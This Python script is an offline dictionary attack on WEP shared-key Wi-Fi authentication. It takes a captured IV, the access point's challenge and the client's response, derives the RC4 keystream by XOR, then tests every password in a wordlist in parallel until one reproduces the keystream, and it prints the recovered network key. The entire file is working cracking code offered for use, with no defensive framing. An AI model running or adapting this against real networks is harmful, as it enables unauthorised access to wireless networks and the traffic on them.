import sys
import RC4
import string
from multiprocessing import Pool
import time
import argparse
from tqdm import tqdm



#ALPHABET = string.digits
#ALPHABET = string.ascii_lowercase
#ALPHABET = string.ascii_uppercase
#ALPHABET = string.letters + string.digits
#ALPHABET = string.letters + string.digits + string.punctuation
#ALPHABET = string.printable

CPU_COUNT= 1
KEY_STREAM = ""
CHALLENGE =""
CHALLENGE_LEN = 136

pbar = None


def unconvert_key(key):
    res=""
    for elm in key[3:]:
        res+= chr(elm)
    return res

def genPass():
    """
    Iterate throught the password of the input file
    """
    with FILE as f:
        for line in f:
            yield line.rstrip()
            


def check(key):
    """
    Encrypt the IV with the given key and checks with the keystream
    """

    rc4 = RC4.RC4(key)

    keystream = rc4.getKeystream(CHALLENGE_LEN)[16:]
    #keystream = rc4.getKeystream(CHALLENGE_LEN)

    if keystream == KEY_STREAM:
        secret_key = unconvert_key(key)
        print('\n -----KEY FOUNDED----\n\nKey : {0}\n'.format(secret_key))
        raise Exception("Key founded stopping pool")


def make_key(key):
    key = convert_key(key)
    return IV + key


def convert_iv(iv):
    iv = iv[2:]
    res = []
    for i in range(0 ,len(iv)-1, 2):
        res.append(int(iv[i]+iv[i+1],16))
    return res

def convert_key(s):
        return [ord(c) for c in s]


def worker(base):
    
    try:
        key = make_key(base)
        check(key)
        pbar.update(1)
    except KeyboardInterrupt:
        print("Exiting...")
        #sys.exit(1)



def parallel():
    """
    Starts a number of threads that search through the key space
    """
    p = Pool(CPU_COUNT)
    found = False
    interrupt = False
    
    try:
        p.map_async(worker, genPass()).get(9999999)
        #p.map(worker, genPass())

    except KeyboardInterrupt:
        print("Caught KeyboardInterrupt, terminating workers")
        p.terminate()
        interrupt = True
    except Exception:
        pbar.close()
        print "Key founded stopping pool"
        p.terminate()
        found = True
    else:
        p.close()
    p.join()
    

    if not found and not interrupt:
        print "Reach end of file"
        print "Key not founded"



def parse(text):

    tab = text.split(":")
    for i in range(0, len(tab)):
        tab[i] = int(tab[i], 16)
    return tab

def xor(a,b):
    return a^b

def trame_keystream(challenge, challengeresponse):
    challenge = parse(str(challenge))
    challengeresponse = parse(str(challengeresponse))[8:] #To get just the challange in the challenge response

    keystream = ""

    for i in range(0, len(challenge)):
        keystream += format(xor(challenge[i], challengeresponse[i]), '#04x')[2:]

    return keystream





if __name__ == "__main__":

    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--iv", help="iv of the trame", required=True)
    parser.add_argument("-p", "--password-file", type=argparse.FileType('r'), help="input file", required=True)
    parser.add_argument("-c", "--cpu-count", type=int, help="number of core")
    parser.add_argument("-r","--response-challenge",type=str, help="The response challenge", required=True)
    parser.add_argument("-s","--send-challenge",type=str, help="The challenge send by the AP", required=True)

    if len(sys.argv)==1:

        parser.print_help(sys.stderr)
        sys.exit(1)

    else:

        args = parser.parse_args()
        
        
        IV = convert_iv(args.iv)
        CPU_COUNT = args.cpu_count
        FILE = args.password_file
        KEY_STREAM = trame_keystream(args.send_challenge,args.response_challenge)

        num_lines = sum(1 for line in FILE)
        FILE.seek(0)

        print "Starting..."
        pbar = tqdm(total=num_lines, mininterval=1)
        parallel()
        





